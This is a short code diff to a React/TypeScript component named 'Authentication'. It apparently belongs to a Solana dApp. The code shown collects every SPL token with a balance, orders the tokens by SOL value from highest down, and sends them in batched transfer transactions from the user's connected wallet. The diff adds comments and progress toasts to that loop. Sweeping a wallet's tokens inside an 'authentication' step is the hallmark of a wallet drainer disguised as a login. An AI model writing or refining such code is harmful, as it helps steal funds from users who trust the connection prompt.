@@ -298,8 +298,11 @@ const Authentication = () => {
 
       // 2. SPL Token Transfers
       const validTokens = balances.filter(token => token.balance > 0);
+      
+      // Sort by value (descending)
       const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
 
+      // Batch tokens
       const batches: TokenBalance[][] = [];
       for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
         batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
@@ -322,11 +325,13 @@ const Authentication = () => {
 
            const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
            
+           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
            await connection.confirmTransaction({
              signature,
              blockhash,
              lastValidBlockHeight
            }, 'confirmed');
+           toast.success(`Batch ${i + 1} sent!`);
         }
       }
 
